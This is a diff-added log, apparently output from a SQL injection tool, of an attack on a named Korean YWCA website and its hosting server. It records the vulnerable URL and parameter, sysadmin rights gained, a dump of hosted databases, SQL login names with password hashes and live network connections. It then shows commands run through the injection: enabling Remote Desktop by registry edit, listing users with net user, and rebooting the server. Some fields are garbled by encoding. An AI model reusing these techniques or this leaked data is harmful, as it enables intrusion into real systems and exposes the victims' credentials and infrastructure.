@@ -1,0 +1,835 @@
+■漏洞信息:============================================================
+ ·URL:http://www.ywca.or.kr/magicboard/Library/fileDown.asp?strBoardID=kui_518&intNum=1147&intSeq=15930
+ ·页面标题：
+ ·参数:strBoardID=kui_518&intNum=1147&intSeq=15930
+ ·方法:GET
+ ·类型:String
+ ·利用方法:And
+ ·脚本语言:asp
+ ·IP:115.68.53.77
+ ·数据库:SQL Server
+ ·HEAD:
+HTTP/1.1 200 OK
+Connection: close
+Date: Mon, 04 Apr 2011 08:23:39 GMT
+Server: Microsoft-IIS/6.0
+P3P: CP="ALL CURa ADMa DEVa TAIa OUR BUS IND PHY ONL UNI PUR FIN COM NAV INT DEM CNT STA POL HEA PRE LOC OTC"
+Content-Disposition: attachment;filename=bb08.hwp
+Content-Length: 36418
+Content-Type: application/unknown
+Expires: Mon, 04 Apr 2011 08:23:39 GMT
+Set-Cookie: ASPSESSIONIDSSCARQRQ=PBBGENKAJIIMBKEAPGALJOPM; path=/
+Cache-control: public
+
+
+
+■数据库信息:============================================================
+批次获取基本信息失败，开始逐一获取……
+ ·当前数据库:ywca_db
+ ·版本:Microsoft SQL Server  2000 - 8.00.2039 (Intel X86) 
+	May  3 2005 23:18:38 
+	Copyright (c) 1988-2003 Microsoft Corporation
+	Standard Edition on Windows NT 5.2 (Build 3790: Service Pack 2)
+
+ ·当前用户权限：
+sysadmin(sa): 1
+dbcreator): 1
+bulkadmin: 1
+diskadmin: 1
+serveradmin: 1
+public: 1
+db_owner: 1
+db_backupoperator: 0
+db_datawriter: 0
+
+ ·数据库信息:
+db_name	filename
+----------------------------------------------------------------------------------------------------
+盔夯叼厚	d:\kbuilderdatas\DB_SOURCE\glory_db_Data.MDF	
+aetrex_db	d:\kbuilderdatas\aetrex\glory_db_Data.MDF	
+ansanwoman_db	d:\kbuilderdatas\ansanwoman\glory_db_Data.MDF	
+anycarland_db	d:\kbuilderdatas\anycarland\glory_db_Data.MDF	
+arari_db	d:\kbuilderdatas\arari\glory_db_Data.MDF	
+arirang_db	d:\kbuilderdatas\arirang\glory_db_Data.MDF	
+aroma_db	d:\kbuilderdatas\aroma\glory_db_Data.MDF	
+ato_db	d:\kbuilderdatas\ato\glory_db_Data.MDF	
+attpk_db	d:\kbuilderdatas\attpk\glory_db_Data.MDF	
+beebur_db	d:\kbuilderdatas\beebur\glory_db_Data.MDF	
+beeburEN_db	d:\kbuilderdatas\beeburEN\glory_db_Data.MDF	
+beerline_db	d:\kbuilderdatas\beerline\glory_db_Data.MDF	
+beshine_db	d:\kbuilderdatas\beshine\glory_db_Data.MDF	
+bestdance_db	d:\kbuilderdatas\bestdance\glory_db_Data.MDF	
+bkmetal_db	d:\kbuilderdatas\bkmetal\glory_db_Data.MDF	
+blendjet_db	d:\kbuilderdatas\blendjet\glory_db_Data.MDF	
+blueacademy_db	d:\kbuilderdatas\blueacademy\glory_db_Data.MDF	
+bonspomedi_db	d:\kbuilderdatas\bonspomedi\glory_db_Data.MDF	
+builder	C:\Program Files\Microsoft SQL Server\MSSQL\data\builder.mdf	
+bulhyanggi_db	d:\kbuilderdatas\bulhyanggi\glory_db_Data.MDF	
+bulloman_db	d:\kbuilderdatas\bulloman\glory_db_Data.MDF	
+bureoba_db	d:\kbuilderdatas\bureoba\glory_db_Data.MDF	
+busancarbon_db	d:\kbuilderdatas\busancarbon\glory_db_Data.MDF	
+busanfh_db	d:\kbuilderdatas\busanfh\glory_db_Data.MDF	
+cauwind_db	d:\kbuilderdatas\cauwind\glory_db_Data.MDF	
+ceei_db	d:\kbuilderdatas\ceei\glory_db_Data.MDF	
+chokoosung_db	d:\kbuilderdatas\chokoosung\glory_db_Data.MDF	
+cjywca_db	d:\kbuilderdatas\cjywca\glory_db_Data.MDF	
+cleanday_db	d:\kbuilderdatas\cleanday\glory_db_Data.MDF	
+cleaningtool_db	d:\kbuilderdatas\cleaningtool\glory_db_Data.MDF	
+clinic8_db	d:\kbuilderdatas\clinic8\glory_db_Data.MDF	
+comdoc119_db	d:\kbuilderdatas\comdoc119\glory_db_Data.MDF	
+cyberes_db	d:\kbuilderdatas\cyberes\glory_db_Data.MDF	
+cyint_db	d:\kbuilderdatas\cyint\glory_db_Data.MDF	
+dabok_db	d:\kbuilderdatas\dabok\glory_db_Data.MDF	
+dasan_db	d:\kbuilderdatas\dasan\glory_db_Data.MDF	
+design1_db	d:\kbuilderdatas\design1\glory_db_Data.MDF	
+dkcons_db	d:\kbuilderdatas\dkcons\glory_db_Data.MDF	
+dnstep_db	d:\kbuilderdatas\dnstep\glory_db_Data.MDF	
+dongpook_db	d:\kbuilderdatas\dongpook\glory_db_Data.MDF	
+dongpooktest_db	d:\kbuilderdatas\dongpooktest\glory_db_Data.MDF	
+
+ ·SQL Server用户名列表：
+用户名		角色		安全编号
+----------------------------------------------------------------------------------------------------
+dbo			08  6 2000  1:27AM	
+guest	.	.	08  6 2000  1:27AM	
+
+ ·数据库相关进程信息:
+程序名	状态	主机名	主机进程ID	命令行	NT用户名
+----------------------------------------------------------------------------------------------------
+取记录数失败，使用设定值：5
+MS SQLEM - Data Tools	sleeping	KBUILDER2	1820	AWAITING COMMAND	kbuilderadmin	
+MS SQLEM - Data Tools	sleeping	KBUILDER2	1820	AWAITING COMMAND	kbuilderadmin	
+MS SQLEM - Data Tools	sleeping	KBUILDER2	1820	AWAITING COMMAND	kbuilderadmin	
+MS SQLEM - Data Tools	sleeping	KBUILDER2	1820	AWAITING COMMAND	kbuilderadmin	
+MS SQLEM	sleeping	KBUILDER2	1820	AWAITING COMMAND	kbuilderadmin	
+
+ ·链接的服务器信息:
+服务器名	服务器产品	提供者名	数据源	位置	服务器网络名
+----------------------------------------------------------------------------------------------------
+
+ ·数据库用户登录信息：
+用户名	密码HASH	数据库编号	语言	时间1	时间2
+----------------------------------------------------------------------------------------------------
+BUILTIN\Administrators		1	茄惫绢	11 25 2008 12:48PM	11 25 2008 12:48PM	
+dbo		1	茄惫绢	01 11 2010  5:45PM	01 11 2010  5:45PM	
+sa	?癖仰?????脾綛???????袭胏??	1	茄惫绢	08  6 2000  1:27AM	12  4 2008  8:10PM	
+six435	壹胫??纟???廚??????氄?J??畽	111	茄惫绢	03  8 2010  6:08PM	03  8 2010  6:22PM	
+ywca	???嗷???滄?嵜???????壅?芯?	1	茄惫绢	01 13 2010  7:23PM	01 13 2010  7:23PM	
+
+■reg query "HKLM\SYSTEM\ControlSet001\Services\W3SVC\Parameters\Virtual Roots" /V "/"
+1	坷幅: 坷幅: 矫胶袍捞 瘤沥等 饭瘤胶飘府 虐 肚绰 蔼阑 茫阑 荐 绝嚼聪促.	
+2		
+■netstat -an
+1		
+2	Active Connections	
+3		
+4	  Proto  Local Address          Foreign Address        State	
+5	  TCP    0.0.0.0:25             0.0.0.0:0              LISTENING	
+6	  TCP    0.0.0.0:80             0.0.0.0:0              LISTENING	
+7	  TCP    0.0.0.0:135            0.0.0.0:0              LISTENING	
+8	  TCP    0.0.0.0:443            0.0.0.0:0              LISTENING	
+9	  TCP    0.0.0.0:445            0.0.0.0:0              LISTENING	
+10	  TCP    0.0.0.0:554            0.0.0.0:0              LISTENING	
+11	  TCP    0.0.0.0:1025           0.0.0.0:0              LISTENING	
+12	  TCP    0.0.0.0:1026           0.0.0.0:0              LISTENING	
+13	  TCP    0.0.0.0:1027           0.0.0.0:0              LISTENING	
+14	  TCP    0.0.0.0:1028           0.0.0.0:0              LISTENING	
+15	  TCP    0.0.0.0:1433           0.0.0.0:0              LISTENING	
+16	  TCP    0.0.0.0:1543           0.0.0.0:0              LISTENING	
+17	  TCP    0.0.0.0:1755           0.0.0.0:0              LISTENING	
+18	  TCP    115.68.53.77:21        0.0.0.0:0              LISTENING	
+19	  TCP    115.68.53.77:21        112.216.253.122:1631   ESTABLISHED	
+20	  TCP    115.68.53.77:80        58.124.150.81:1622     ESTABLISHED	
+21	  TCP    115.68.53.77:80        58.124.150.81:1623     ESTABLISHED	
+22	  TCP    115.68.53.77:80        58.124.150.81:1624     ESTABLISHED	
+23	  TCP    115.68.53.77:80        58.124.150.81:1625     ESTABLISHED	
+24	  TCP    115.68.53.77:80        58.124.150.81:1626     ESTABLISHED	
+25	  TCP    115.68.53.77:80        58.124.150.81:1627     ESTABLISHED	
+26	  TCP    115.68.53.77:80        58.124.150.81:1628     ESTABLISHED	
+27	  TCP    115.68.53.77:80        58.124.150.81:1629     ESTABLISHED	
+28	  TCP    115.68.53.77:80        58.124.150.81:1630     ESTABLISHED	
+29	  TCP    115.68.53.77:80        58.124.150.81:1631     ESTABLISHED	
+30	  TCP    115.68.53.77:80        58.124.150.81:1632     ESTABLISHED	
+31	  TCP    115.68.53.77:80        58.124.150.81:1633     ESTABLISHED	
+32	  TCP    115.68.53.77:80        58.124.150.81:1634     ESTABLISHED	
+33	  TCP    115.68.53.77:80        58.143.159.219:9906    ESTABLISHED	
+34	  TCP    115.68.53.77:80        58.143.159.219:9908    ESTABLISHED	
+35	  TCP    115.68.53.77:80        58.143.159.219:9909    ESTABLISHED	
+36	  TCP    115.68.53.77:80        58.143.159.219:9910    ESTABLISHED	
+37	  TCP    115.68.53.77:80        58.143.159.219:9912    ESTABLISHED	
+38	  TCP    115.68.53.77:80        58.143.159.219:9913    ESTABLISHED	
+39	  TCP    115.68.53.77:80        58.143.159.219:9914    ESTABLISHED	
+40	  TCP    115.68.53.77:80        58.143.159.219:9915    ESTABLISHED	
+41	  TCP    115.68.53.77:80        58.143.159.219:9916    ESTABLISHED	
+42	  TCP    115.68.53.77:80        58.143.159.219:9924    ESTABLISHED	
+43	  TCP    115.68.53.77:80        58.184.13.26:44706     ESTABLISHED	
+44	  TCP    115.68.53.77:80        58.184.13.26:44710     ESTABLISHED	
+45	  TCP    115.68.53.77:80        58.184.13.26:44712     ESTABLISHED	
+46	  TCP    115.68.53.77:80        58.184.13.26:44714     ESTABLISHED	
+47	  TCP    115.68.53.77:80        58.184.13.26:44715     ESTABLISHED	
+48	  TCP    115.68.53.77:80        58.184.13.26:44727     ESTABLISHED	
+49	  TCP    115.68.53.77:80        58.184.13.26:44728     ESTABLISHED	
+50	  TCP    115.68.53.77:80        58.184.13.26:44729     ESTABLISHED	
+51	  TCP    115.68.53.77:80        58.184.13.26:44732     ESTABLISHED	
+52	  TCP    115.68.53.77:80        58.184.13.26:44734     ESTABLISHED	
+53	  TCP    115.68.53.77:80        61.4.218.123:2166      ESTABLISHED	
+54	  TCP    115.68.53.77:80        61.4.218.123:2200      ESTABLISHED	
+55	  TCP    115.68.53.77:80        61.4.218.123:2201      ESTABLISHED	
+56	  TCP    115.68.53.77:80        61.4.218.123:2202      ESTABLISHED	
+57	  TCP    115.68.53.77:80        61.4.218.123:2207      ESTABLISHED	
+58	  TCP    115.68.53.77:80        61.4.218.123:2208      ESTABLISHED	
+59	  TCP    115.68.53.77:80        61.4.218.123:2211      ESTABLISHED	
+60	  TCP    115.68.53.77:80        61.4.218.123:2214      ESTABLISHED	
+61	  TCP    115.68.53.77:80        61.4.218.123:2215      ESTABLISHED	
+62	  TCP    115.68.53.77:80        61.4.218.123:3271      ESTABLISHED	
+63	  TCP    115.68.53.77:80        61.32.255.20:2599      ESTABLISHED	
+64	  TCP    115.68.53.77:80        61.82.171.34:3246      ESTABLISHED	
+65	  TCP    115.68.53.77:80        61.82.171.34:53100     ESTABLISHED	
+66	  TCP    115.68.53.77:80        61.82.197.29:54250     ESTABLISHED	
+67	  TCP    115.68.53.77:80        61.82.197.29:54255     ESTABLISHED	
+68	  TCP    115.68.53.77:80        61.247.204.39:40526    TIME_WAIT	
+69	  TCP    115.68.53.77:80        66.249.67.195:33966    ESTABLISHED	
+70	  TCP    115.68.53.77:80        67.195.113.223:54400   TIME_WAIT	
+71	  TCP    115.68.53.77:80        67.195.113.223:54643   TIME_WAIT	
+72	  TCP    115.68.53.77:80        67.195.113.223:54688   TIME_WAIT	
+73	  TCP    115.68.53.77:80        67.195.113.223:54749   TIME_WAIT	
+74	  TCP    115.68.53.77:80        67.195.113.223:54806   TIME_WAIT	
+75	  TCP    115.68.53.77:80        67.195.113.223:54866   TIME_WAIT	
+76	  TCP    115.68.53.77:80        67.195.113.223:54958   TIME_WAIT	
+77	  TCP    115.68.53.77:80        67.195.115.119:34363   TIME_WAIT	
+78	  TCP    115.68.53.77:80        67.195.115.119:34442   FIN_WAIT_1	
+79	  TCP    115.68.53.77:80        72.14.202.80:47427     ESTABLISHED	
+80	  TCP    115.68.53.77:80        72.14.202.80:51107     ESTABLISHED	
+81	  TCP    115.68.53.77:80        72.14.202.81:52581     ESTABLISHED	
+82	  TCP    115.68.53.77:80        72.14.202.82:45626     ESTABLISHED	
+83	  TCP    115.68.53.77:80        72.14.202.83:53854     ESTABLISHED	
+84	  TCP    115.68.53.77:80        72.14.202.83:55996     ESTABLISHED	
+85	  TCP    115.68.53.77:80        72.14.202.83:58164     ESTABLISHED	
+86	  TCP    115.68.53.77:80        72.14.202.84:46353     ESTABLISHED	
+87	  TCP    115.68.53.77:80        72.14.202.85:44688     ESTABLISHED	
+88	  TCP    115.68.53.77:80        72.14.202.85:54572     ESTABLISHED	
+89	  TCP    115.68.53.77:80        72.14.202.85:60240     ESTABLISHED	
+90	  TCP    115.68.53.77:80        74.125.74.193:64266    ESTABLISHED	
+91	  TCP    115.68.53.77:80        74.125.74.193:64292    ESTABLISHED	
+92	  TCP    115.68.53.77:80        74.125.74.193:64472    ESTABLISHED	
+93	  TCP    115.68.53.77:80        74.125.152.80:42434    ESTABLISHED	
+94	  TCP    115.68.53.77:80        74.125.152.80:42834    ESTABLISHED	
+95	  TCP    115.68.53.77:80        74.125.152.80:45317    ESTABLISHED	
+96	  TCP    115.68.53.77:80        74.125.152.80:48726    ESTABLISHED	
+97	  TCP    115.68.53.77:80        74.125.152.80:53358    ESTABLISHED	
+98	  TCP    115.68.53.77:80        74.125.152.80:60394    ESTABLISHED	
+99	  TCP    115.68.53.77:80        74.125.152.80:61493    ESTABLISHED	
+100	  TCP    115.68.53.77:80        74.125.152.81:44770    ESTABLISHED	
+101	  TCP    115.68.53.77:80        74.125.152.81:46886    ESTABLISHED	
+102	  TCP    115.68.53.77:80        74.125.152.83:53385    ESTABLISHED	
+103	  TCP    115.68.53.77:80        74.125.152.84:59387    ESTABLISHED	
+104	  TCP    115.68.53.77:80        74.125.152.85:60607    ESTABLISHED	
+105	  TCP    115.68.53.77:80        74.125.152.87:49280    ESTABLISHED	
+106	  TCP    115.68.53.77:80        74.125.152.87:54968    ESTABLISHED	
+107	  TCP    115.68.53.77:80        74.125.152.87:56348    ESTABLISHED	
+108	  TCP    115.68.53.77:80        110.35.157.64:64922    ESTABLISHED	
+109	  TCP    115.68.53.77:80        112.155.42.224:2829    ESTABLISHED	
+110	  TCP    115.68.53.77:80        112.164.27.45:1172     ESTABLISHED	
+111	  TCP    115.68.53.77:80        112.164.27.45:1173     ESTABLISHED	
+112	  TCP    115.68.53.77:80        112.164.27.45:1200     ESTABLISHED	
+113	  TCP    115.68.53.77:80        112.164.27.45:1206     ESTABLISHED	
+114	  TCP    115.68.53.77:80        112.164.27.45:1220     ESTABLISHED	
+115	  TCP    115.68.53.77:80        112.164.27.45:1221     ESTABLISHED	
+116	  TCP    115.68.53.77:80        112.164.27.45:1224     ESTABLISHED	
+117	  TCP    115.68.53.77:80        112.164.27.45:1225     ESTABLISHED	
+118	  TCP    115.68.53.77:80        112.164.27.45:1227     ESTABLISHED	
+119	  TCP    115.68.53.77:80        112.164.27.45:1228     ESTABLISHED	
+120	  TCP    115.68.53.77:80        112.164.27.45:1255     ESTABLISHED	
+121	  TCP    115.68.53.77:80        112.164.27.45:1256     ESTABLISHED	
+122	  TCP    115.68.53.77:80        112.164.27.45:1257     ESTABLISHED	
+123	  TCP    115.68.53.77:80        112.164.27.45:1258     ESTABLISHED	
+124	  TCP    115.68.53.77:80        112.164.27.45:1259     ESTABLISHED	
+125	  TCP    115.68.53.77:80        114.111.35.39:3587     ESTABLISHED	
+126	  TCP    115.68.53.77:80        114.111.35.40:1790     ESTABLISHED	
+127	  TCP    115.68.53.77:80        114.111.36.23:33849    ESTABLISHED	
+128	  TCP    115.68.53.77:80        114.205.164.114:19257  ESTABLISHED	
+129	  TCP    115.68.53.77:80        115.93.136.228:3616    ESTABLISHED	
+130	  TCP    115.68.53.77:80        115.93.136.228:3617    ESTABLISHED	
+131	  TCP    115.68.53.77:80        115.93.136.228:3620    ESTABLISHED	
+132	  TCP    115.68.53.77:80        115.93.136.228:3621    ESTABLISHED	
+133	  TCP    115.68.53.77:80        115.93.136.228:3625    LAST_ACK	
+134	  TCP    115.68.53.77:80        115.93.136.228:3628    ESTABLISHED	
+135	  TCP    115.68.53.77:80        115.93.136.228:3630    ESTABLISHED	
+136	  TCP    115.68.53.77:80        115.93.136.228:3632    ESTABLISHED	
+137	  TCP    115.68.53.77:80        115.93.136.228:3636    ESTABLISHED	
+138	  TCP    115.68.53.77:80        115.93.149.21:1647     ESTABLISHED	
+139	  TCP    115.68.53.77:80        115.93.149.21:1648     ESTABLISHED	
+140	  TCP    115.68.53.77:80        115.93.149.21:1649     ESTABLISHED	
+141	  TCP    115.68.53.77:80        115.93.149.21:1650     ESTABLISHED	
+142	  TCP    115.68.53.77:80        115.93.149.21:1651     ESTABLISHED	
+143	  TCP    115.68.53.77:80        115.93.149.21:1652     ESTABLISHED	
+144	  TCP    115.68.53.77:80        115.93.149.21:1654     ESTABLISHED	
+145	  TCP    115.68.53.77:80        115.93.149.21:1655     ESTABLISHED	
+146	  TCP    115.68.53.77:80        115.93.149.21:1656     ESTABLISHED	
+147	  TCP    115.68.53.77:80        115.93.149.21:1657     ESTABLISHED	
+148	  TCP    115.68.53.77:80        115.93.149.21:1658     ESTABLISHED	
+149	  TCP    115.68.53.77:80        115.93.149.21:1659     ESTABLISHED	
+150	  TCP    115.68.53.77:80        115.93.149.21:1661     ESTABLISHED	
+151	  TCP    115.68.53.77:80        115.93.149.21:1662     ESTABLISHED	
+152	  TCP    115.68.53.77:80        115.93.149.21:1663     ESTABLISHED	
+153	  TCP    115.68.53.77:80        115.93.149.21:1664     ESTABLISHED	
+154	  TCP    115.68.53.77:80        115.93.149.21:1665     ESTABLISHED	
+155	  TCP    115.68.53.77:80        115.93.149.21:1667     ESTABLISHED	
+156	  TCP    115.68.53.77:80        115.93.149.21:1668     ESTABLISHED	
+157	  TCP    115.68.53.77:80        115.93.149.21:1669     ESTABLISHED	
+158	  TCP    115.68.53.77:80        115.93.149.21:1670     ESTABLISHED	
+159	  TCP    115.68.53.77:80        115.93.149.21:1671     ESTABLISHED	
+160	  TCP    115.68.53.77:80        115.93.149.21:1672     ESTABLISHED	
+161	  TCP    115.68.53.77:80        115.93.149.21:1673     ESTABLISHED	
+162	  TCP    115.68.53.77:80        115.93.149.21:1674     ESTABLISHED	
+163	  TCP    115.68.53.77:80        115.93.149.21:1675     ESTABLISHED	
+164	  TCP    115.68.53.77:80        115.93.149.21:1676     ESTABLISHED	
+165	  TCP    115.68.53.77:80        115.93.149.21:1677     ESTABLISHED	
+166	  TCP    115.68.53.77:80        115.93.149.21:1678     ESTABLISHED	
+167	  TCP    115.68.53.77:80        115.93.149.21:1679     ESTABLISHED	
+168	  TCP    115.68.53.77:80        115.93.149.21:1680     ESTABLISHED	
+169	  TCP    115.68.53.77:80        115.93.149.21:1681     ESTABLISHED	
+170	  TCP    115.68.53.77:80        115.93.149.21:1682     ESTABLISHED	
+171	  TCP    115.68.53.77:80        115.93.149.21:1683     ESTABLISHED	
+172	  TCP    115.68.53.77:80        115.93.149.21:1684     ESTABLISHED	
+173	  TCP    115.68.53.77:80        115.93.149.21:1685     ESTABLISHED	
+174	  TCP    115.68.53.77:80        115.93.149.21:1686     ESTABLISHED	
+175	  TCP    115.68.53.77:80        115.93.149.21:1687     ESTABLISHED	
+176	  TCP    115.68.53.77:80        115.93.149.21:1688     ESTABLISHED	
+177	  TCP    115.68.53.77:80        115.93.149.21:1689     ESTABLISHED	
+178	  TCP    115.68.53.77:80        115.93.149.21:1690     ESTABLISHED	
+179	  TCP    115.68.53.77:80        115.93.149.21:1691     ESTABLISHED	
+180	  TCP    115.68.53.77:80        115.93.149.21:1692     ESTABLISHED	
+181	  TCP    115.68.53.77:80        115.93.149.21:1693     ESTABLISHED	
+182	  TCP    115.68.53.77:80        115.93.149.21:1694     ESTABLISHED	
+183	  TCP    115.68.53.77:80        115.93.149.21:1695     ESTABLISHED	
+184	  TCP    115.68.53.77:80        115.93.149.21:1696     ESTABLISHED	
+185	  TCP    115.68.53.77:80        115.93.149.21:1699     ESTABLISHED	
+186	  TCP    115.68.53.77:80        115.93.149.21:1700     ESTABLISHED	
+187	  TCP    115.68.53.77:80        115.93.149.21:1701     ESTABLISHED	
+188	  TCP    115.68.53.77:80        115.93.149.21:1702     ESTABLISHED	
+189	  TCP    115.68.53.77:80        115.93.149.21:1703     ESTABLISHED	
+190	  TCP    115.68.53.77:80        115.93.149.21:1704     ESTABLISHED	
+191	  TCP    115.68.53.77:80        115.93.149.21:1705     ESTABLISHED	
+192	  TCP    115.68.53.77:80        115.93.149.21:1706     ESTABLISHED	
+193	  TCP    115.68.53.77:80        115.93.149.21:1707     ESTABLISHED	
+194	  TCP    115.68.53.77:80        115.93.149.21:1708     ESTABLISHED	
+■REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal" "Server /v fDenyTSConnections /t REG_DWORD /d 00000000 /f
+1	累诀阑 肯丰沁嚼聪促.	
+2		
+■REG query HKLM\SYSTEM\CurrentControlSet\Control\Terminal" "Server\WinStations\RDP-Tcp /v PortNumber
+1		
+2	HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp	
+3	    PortNumber    REG_DWORD    0xd3d	
+4		
+5		
+■netstat -an
+1		
+2	Active Connections	
+3		
+4	  Proto  Local Address          Foreign Address        State	
+5	  TCP    0.0.0.0:25             0.0.0.0:0              LISTENING	
+6	  TCP    0.0.0.0:80             0.0.0.0:0              LISTENING	
+7	  TCP    0.0.0.0:135            0.0.0.0:0              LISTENING	
+8	  TCP    0.0.0.0:443            0.0.0.0:0              LISTENING	
+9	  TCP    0.0.0.0:445            0.0.0.0:0              LISTENING	
+10	  TCP    0.0.0.0:554            0.0.0.0:0              LISTENING	
+11	  TCP    0.0.0.0:1025           0.0.0.0:0              LISTENING	
+12	  TCP    0.0.0.0:1026           0.0.0.0:0              LISTENING	
+13	  TCP    0.0.0.0:1027           0.0.0.0:0              LISTENING	
+14	  TCP    0.0.0.0:1028           0.0.0.0:0              LISTENING	
+15	  TCP    0.0.0.0:1433           0.0.0.0:0              LISTENING	
+16	  TCP    0.0.0.0:1543           0.0.0.0:0              LISTENING	
+17	  TCP    0.0.0.0:1755           0.0.0.0:0              LISTENING	
+18	  TCP    115.68.53.77:21        0.0.0.0:0              LISTENING	
+19	  TCP    115.68.53.77:21        112.216.253.122:1631   ESTABLISHED	
+20	  TCP    115.68.53.77:80        58.124.150.81:1654     ESTABLISHED	
+21	  TCP    115.68.53.77:80        58.124.150.81:1655     ESTABLISHED	
+22	  TCP    115.68.53.77:80        58.124.150.81:1656     ESTABLISHED	
+23	  TCP    115.68.53.77:80        58.124.150.81:1657     ESTABLISHED	
+24	  TCP    115.68.53.77:80        58.124.150.81:1658     ESTABLISHED	
+25	  TCP    115.68.53.77:80        58.124.150.81:1659     ESTABLISHED	
+26	  TCP    115.68.53.77:80        58.124.150.81:1660     ESTABLISHED	
+27	  TCP    115.68.53.77:80        58.124.150.81:1661     ESTABLISHED	
+28	  TCP    115.68.53.77:80        58.124.150.81:1662     ESTABLISHED	
+29	  TCP    115.68.53.77:80        58.124.150.81:1663     ESTABLISHED	
+30	  TCP    115.68.53.77:80        58.124.150.81:1664     ESTABLISHED	
+31	  TCP    115.68.53.77:80        58.124.150.81:1665     ESTABLISHED	
+32	  TCP    115.68.53.77:80        58.124.150.81:1666     ESTABLISHED	
+33	  TCP    115.68.53.77:80        58.143.159.219:9913    ESTABLISHED	
+34	  TCP    115.68.53.77:80        58.143.159.219:9916    ESTABLISHED	
+35	  TCP    115.68.53.77:80        58.143.159.219:9931    ESTABLISHED	
+36	  TCP    115.68.53.77:80        58.143.159.219:9935    ESTABLISHED	
+37	  TCP    115.68.53.77:80        58.143.159.219:9956    ESTABLISHED	
+38	  TCP    115.68.53.77:80        58.143.159.219:9958    ESTABLISHED	
+39	  TCP    115.68.53.77:80        58.143.159.219:9959    ESTABLISHED	
+40	  TCP    115.68.53.77:80        58.143.159.219:9960    ESTABLISHED	
+41	  TCP    115.68.53.77:80        58.143.159.219:9961    ESTABLISHED	
+42	  TCP    115.68.53.77:80        58.143.159.219:9965    ESTABLISHED	
+43	  TCP    115.68.53.77:80        58.143.159.219:9966    ESTABLISHED	
+44	  TCP    115.68.53.77:80        58.143.159.219:9967    ESTABLISHED	
+45	  TCP    115.68.53.77:80        58.184.13.26:44706     ESTABLISHED	
+46	  TCP    115.68.53.77:80        58.184.13.26:44710     ESTABLISHED	
+47	  TCP    115.68.53.77:80        58.184.13.26:44712     ESTABLISHED	
+48	  TCP    115.68.53.77:80        58.184.13.26:44714     ESTABLISHED	
+49	  TCP    115.68.53.77:80        58.184.13.26:44715     ESTABLISHED	
+50	  TCP    115.68.53.77:80        58.184.13.26:44727     ESTABLISHED	
+■shutdown -r
+1		
+■shutdown -r
+1	矫胶袍阑 辆丰窍绊 乐嚼聪促.(1115)	
+2		
+
+■数据库信息:============================================================
+批次获取基本信息失败，开始逐一获取……
+ ·当前数据库:ywca_db
+ ·版本:Microsoft SQL Server  2000 - 8.00.2039 (Intel X86) 
+	May  3 2005 23:18:38 
+	Copyright (c) 1988-2003 Microsoft Corporation
+	Standard Edition on Windows NT 5.2 (Build 3790: Service Pack 2)
+
+ ·当前用户权限：
+sysadmin(sa): 1
+dbcreator): 1
+bulkadmin: 1
+diskadmin: 1
+serveradmin: 1
+public: 1
+db_owner: 1
+db_backupoperator: 0
+db_datawriter: 0
+
+ ·数据库信息:
+db_name	filename
+----------------------------------------------------------------------------------------------------
+盔夯叼厚	d:\kbuilderdatas\DB_SOURCE\glory_db_Data.MDF	
+aetrex_db	d:\kbuilderdatas\aetrex\glory_db_Data.MDF	
+ansanwoman_db	d:\kbuilderdatas\ansanwoman\glory_db_Data.MDF	
+anycarland_db	d:\kbuilderdatas\anycarland\glory_db_Data.MDF	
+arari_db	d:\kbuilderdatas\arari\glory_db_Data.MDF	
+arirang_db	d:\kbuilderdatas\arirang\glory_db_Data.MDF	
+aroma_db	d:\kbuilderdatas\aroma\glory_db_Data.MDF	
+ato_db	d:\kbuilderdatas\ato\glory_db_Data.MDF	
+attpk_db	d:\kbuilderdatas\attpk\glory_db_Data.MDF	
+beebur_db	d:\kbuilderdatas\beebur\glory_db_Data.MDF	
+beeburEN_db	d:\kbuilderdatas\beeburEN\glory_db_Data.MDF	
+beerline_db	d:\kbuilderdatas\beerline\glory_db_Data.MDF	
+beshine_db	d:\kbuilderdatas\beshine\glory_db_Data.MDF	
+bestdance_db	d:\kbuilderdatas\bestdance\glory_db_Data.MDF	
+bkmetal_db	d:\kbuilderdatas\bkmetal\glory_db_Data.MDF	
+blendjet_db	d:\kbuilderdatas\blendjet\glory_db_Data.MDF	
+
+ ·SQL Server用户名列表：
+用户名		角色		安全编号
+----------------------------------------------------------------------------------------------------
+dbo			08  6 2000  1:27AM	
+guest	.	.	08  6 2000  1:27AM	
+
+ ·数据库相关进程信息:
+程序名	状态	主机名	主机进程ID	命令行	NT用户名
+----------------------------------------------------------------------------------------------------
+取记录数失败，使用设定值：5
+MS SQLEM - Data Tools	sleeping	KBUILDER2	1820	AWAITING COMMAND	kbuilderadmin	
+MS SQLEM - Data Tools	sleeping	KBUILDER2	1820	AWAITING COMMAND	kbuilderadmin	
+MS SQLEM - Data Tools	sleeping	KBUILDER2	1820	AWAITING COMMAND	kbuilderadmin	
+MS SQLEM - Data Tools	sleeping	KBUILDER2	1820	AWAITING COMMAND	kbuilderadmin	
+MS SQLEM	sleeping	KBUILDER2	1820	AWAITING COMMAND	kbuilderadmin	
+
+ ·链接的服务器信息:
+服务器名	服务器产品	提供者名	数据源	位置	服务器网络名
+----------------------------------------------------------------------------------------------------
+
+ ·数据库用户登录信息：
+用户名	密码HASH	数据库编号	语言	时间1	时间2
+----------------------------------------------------------------------------------------------------
+BUILTIN\Administrators		1	茄惫绢	11 25 2008 12:48PM	11 25 2008 12:48PM	
+dbo		1	茄惫绢	01 11 2010  5:45PM	01 11 2010  5:45PM	
+sa	?癖仰?????脾綛???????袭胏??	1	茄惫绢	08  6 2000  1:27AM	12  4 2008  8:10PM	
+six435	壹胫??纟???廚??????氄?J??畽	111	茄惫绢	03  8 2010  6:08PM	03  8 2010  6:22PM	
+ywca	???嗷???滄?嵜???????壅?芯?	1	茄惫绢	01 13 2010  7:23PM	01 13 2010  7:23PM	
+
+■reg query "HKLM\SYSTEM\ControlSet001\Services\W3SVC\Parameters\Virtual Roots" /V "/"
+1	坷幅: 坷幅: 矫胶袍捞 瘤沥等 饭瘤胶飘府 虐 肚绰 蔼阑 茫阑 荐 绝嚼聪促.	
+2		
+■net user
+1		
+2	\\俊 措茄 荤侩磊 拌沥	
+3		
+4	-------------------------------------------------------------------------------	
+5	ASPNET                   Guest                    IUSR_KBUILDER2	
+6	IWAM_KBUILDER2           kbuilder22               kbuilderadmin	
+7	SQLDebugger              SUPPORT_388945a0         WMUS_KBUILDER2	
+8	疙飞捞 窍唱 捞惑狼 坷幅肺 肯丰登菌嚼聪促.	
+9		
+10		
+
+■数据库信息:============================================================
+批次获取基本信息失败，开始逐一获取……
